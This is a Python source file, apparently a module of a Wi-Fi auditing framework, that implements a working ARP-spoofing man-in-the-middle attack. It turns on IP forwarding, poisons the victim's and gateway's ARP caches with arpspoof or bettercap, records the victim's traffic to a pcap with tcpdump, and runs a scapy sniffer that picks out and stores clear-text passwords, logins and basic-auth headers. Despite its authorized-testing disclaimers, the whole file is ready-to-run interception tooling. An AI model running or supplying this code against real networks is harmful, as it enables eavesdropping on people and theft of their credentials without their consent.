#!/usr/bin/env python3
"""
LAN Man-in-the-Middle module for Wifi-Audit-Framework.
FOR AUTHORIZED PENETRATION TESTING / AUDITING ONLY — run only against
hosts/networks you own or have explicit written permission to test.

This is the *post-association* MITM companion to option 5 (Evil Twin):
connect to the target network normally, then position this host between a
victim and the gateway with bidirectional ARP spoofing while capturing
traffic to a pcap and flagging clear-text credentials live.

Pipeline:
    IP forwarding on  →  resolve gateway/victim MACs  →  arpspoof both
    directions  →  tcpdump capture  →  scapy HTTP credential watcher
    (optional)  →  restore correct ARP tables on stop.

Tools (Debian/Kali):
    arpspoof (dsniff)  →  apt install dsniff
    tcpdump (optional capture)  →  apt install tcpdump
    scapy watcher reuses the framework's existing scapy dependency.
    bettercap, if present, is used as a single-process alternative backend.

Typical usage from main.py option 9:
    from mitm_attack import MITMAttack
    atk = MITMAttack(iface="eth0", gateway_ip="192.168.1.1",
                     target_ip="192.168.1.50", capture="/tmp/wpf_mitm.pcap")
    atk.run()   # blocks until Ctrl+C; always restores ARP tables
"""

import re
import shutil
import subprocess
import threading
import time
from pathlib import Path

from ui import UI


class MITMAttack:
    """Bidirectional ARP-spoof MITM with pcap capture + live credential hints."""

    def __init__(self, iface: str, gateway_ip: str, target_ip: str,
                 capture: str = "/tmp/wpf_mitm.pcap", sniff_creds: bool = True):
        self.iface = iface
        self.gateway_ip = gateway_ip.strip()
        self.target_ip = target_ip.strip()
        self.capture = capture
        self.sniff_creds = sniff_creds
        self._procs: list = []
        self._stop = threading.Event()
        self._creds: list = []
        self.backend = "arpspoof"  # or "bettercap"

    # ------------------------------------------------------------------
    #  Discovery / tooling helpers
    # ------------------------------------------------------------------
    @staticmethod
    def check_tools() -> dict:
        found = {t: shutil.which(t) for t in ("arpspoof", "tcpdump", "bettercap", "arping")}
        if found["bettercap"]:
            UI.ok("MITM backend: bettercap available (preferred).")
        elif found["arpspoof"]:
            UI.ok("MITM backend: arpspoof available.")
        else:
            UI.error("No ARP-spoof backend found — install one: sudo apt install dsniff  (or bettercap)")
        if not found["tcpdump"]:
            UI.warn("'tcpdump' not found — pcap capture will be skipped (live watcher still runs).")
        return found

    @staticmethod
    def detect_gateway() -> str | None:
        """Parse `ip route show default` → gateway IP, mirroring EvilTwin."""
        try:
            out = subprocess.check_output(["ip", "route", "show", "default"], text=True)
            m = re.search(r"default via (\S+)", out)
            if m:
                UI.info(f"Auto-detected gateway: {UI.CYAN}{m.group(1)}{UI.RESET}")
                return m.group(1)
        except Exception:
            pass
        return None

    @staticmethod
    def _mac_of(ip: str, iface: str) -> str | None:
        """Resolve MAC via `ip neigh`, prodding with arping first if needed."""
        try:
            if shutil.which("arping"):
                subprocess.run(["arping", "-c", "2", "-I", iface, ip],
                               capture_output=True, timeout=8)
            out = subprocess.check_output(["ip", "neigh", "show", ip], text=True)
            m = re.search(r"lladdr\s+([0-9a-fA-F:]{17})", out)
            return m.group(1).lower() if m else None
        except Exception:
            return None

    @staticmethod
    def _enable_forwarding(enable: bool = True):
        val = "1" if enable else "0"
        for node in ("net.ipv4.ip_forward",):
            try:
                subprocess.run(["sysctl", "-w", f"{node}={val}"], capture_output=True)
            except Exception:
                pass

    # ------------------------------------------------------------------
    #  Backends
    # ------------------------------------------------------------------
    def _start_arpspoof(self):
        """Two arpspoof processes: victim⇄gateway (classic bidirectional MITM)."""
        pairs = [
            (self.gateway_ip, self.target_ip),  # tell victim we are the gateway
            (self.target_ip, self.gateway_ip),  # tell gateway we are the victim
        ]
        for spoof, tell in pairs:
            cmd = ["arpspoof", "-i", self.iface, "-t", tell, spoof]
            UI.info(f"ARP spoof: {' '.join(cmd)}")
            try:
                p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
            except FileNotFoundError:
                UI.error("'arpspoof' not found — sudo apt install dsniff")
                raise
            self._procs.append(p)
        time.sleep(0.5)

    def _start_bettercap(self):
        cap = (f"set arp.spoof.targets {self.target_ip}; "
               f"set arp.spoof.internal true; arp.spoof on; net.sniff on")
        cmd = ["bettercap", "-iface", self.iface, "-eval", cap]
        UI.info(f"bettercap: {' '.join(cmd)}")
        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                             text=True, bufsize=1)
        self._procs.append(p)
        threading.Thread(target=self._drain, args=(p,), daemon=True).start()

    def _drain(self, proc):
        try:
            for line in proc.stdout:
                if self._stop.is_set():
                    break
                line = line.rstrip()
                if line and ("[sys.log]" in line or "arp.spoof" in line.lower()
                             or "endpoint" in line.lower()):
                    print(f"  {UI.DIM}[mitm] {line[:220]}{UI.RESET}")
        except Exception:
            pass

    def _start_capture(self):
        if not shutil.which("tcpdump"):
            return
        cmd = ["tcpdump", "-i", self.iface, "-w", self.capture, "-s", "0",
               "host", self.target_ip]
        UI.info(f"Capture: {' '.join(cmd)}")
        try:
            self._procs.append(subprocess.Popen(
                cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
        except Exception as e:
            UI.warn(f"tcpdump failed to start: {e}")

    def _cred_watcher(self):
        """Scapy thread: flag HTTP POSTs / basic-auth transiting the victim."""
        try:
            from scapy.all import sniff, TCP, Raw
        except ImportError:
            UI.warn("scapy watcher unavailable.")
            return

        def _cb(pkt):
            try:
                if not (pkt.haslayer(TCP) and pkt.haslayer(Raw)):
                    return
                try:
                    data = bytes(pkt[Raw].load).decode("utf-8", errors="ignore")
                except Exception:
                    return
                if not data.startswith(("POST ", "GET ", "PUT ")):
                    return
                host = next((l[6:] for l in data.split("\r\n")
                             if l.lower().startswith("host: ")), "?")
                keys = ("password=", "passwd=", "pwd=", "pass=", "user=", "username=",
                        "email=", "login=", "authorization: basic")
                if any(k in data.lower() for k in keys):
                    UI.ok(f"Possible credential transit → host:{UI.YELLOW}{host.strip()}{UI.RESET} "
                          f"(see {self.capture})")
                    self._creds.append({"host": host.strip(),
                                        "preview": data[:300].replace("\n", " ")})
            except Exception:
                pass

        try:
            sniff(iface=self.iface, prn=_cb, store=0,
                  stop_filter=lambda _p: self._stop.is_set())
        except Exception as e:
            UI.warn(f"Credential watcher stopped: {e}")

    # ------------------------------------------------------------------
    #  Lifecycle
    # ------------------------------------------------------------------
    def run(self) -> dict:
        UI.section(f"MITM — {self.target_ip} ⇄ {self.gateway_ip}")
        UI.warn("Authorized testing ONLY — ARP spoofing disrupts the target's "
                "traffic. Stay on networks you own / may test.")
        tools = self.check_tools()
        if not (tools["bettercap"] or tools["arpspoof"]):
            return {"ok": False, "reason": "no-backend"}

        gw_mac = self._mac_of(self.gateway_ip, self.iface)
        tgt_mac = self._mac_of(self.target_ip, self.iface)
        if gw_mac:
            UI.info(f"Gateway {self.gateway_ip} → {gw_mac}")
        else:
            UI.warn(f"Could not resolve gateway MAC for {self.gateway_ip} — continuing anyway.")
        if tgt_mac:
            UI.info(f"Target  {self.target_ip} → {tgt_mac}")
        else:
            UI.warn(f"Could not resolve target MAC for {self.target_ip} — is it up? Continuing anyway.")

        self._enable_forwarding(True)
        self.backend = "bettercap" if tools["bettercap"] else "arpspoof"
        try:
            if self.backend == "bettercap":
                self._start_bettercap()
            else:
                self._start_arpspoof()
            self._start_capture()
            if self.sniff_creds:
                threading.Thread(target=self._cred_watcher, daemon=True).start()
            UI.ok(f"MITM live ({self.backend}) — victim {UI.YELLOW}{self.target_ip}{UI.RESET} "
                  f"via {UI.CYAN}{self.iface}{UI.RESET}. Press Ctrl+C to stop & restore.")
            while not self._stop.is_set():
                time.sleep(1)
        except KeyboardInterrupt:
            print()
            UI.info("Stopping MITM...")
        finally:
            self.stop()
        UI.ok(f"Capture: {self.capture}  |  credential hints: {len(self._creds)}")
        return {"ok": True, "backend": self.backend, "capture": self.capture,
                "creds": self._creds}

    def stop(self):
        self._stop.set()
        for p in list(self._procs):
            try:
                if p.poll() is None:
                    p.terminate()
                    try:
                        p.wait(timeout=4)
                    except Exception:
                        p.kill()
            except Exception:
                pass
        self._restore_arp()

    def _restore_arp(self):
        """Send a few correct ARP announcements so victim/gateway heal fast."""
        try:
            if shutil.which("arping"):
                subprocess.run(["arping", "-c", "3", "-U", "-I", self.iface, self.gateway_ip],
                               capture_output=True, timeout=8)
                subprocess.run(["arping", "-c", "3", "-U", "-I", self.iface, self.target_ip],
                               capture_output=True, timeout=8)
            UI.ok("ARP tables restored (correct announcements sent).")
        except Exception as e:
            UI.warn(f"ARP restore best-effort failed: {e}")
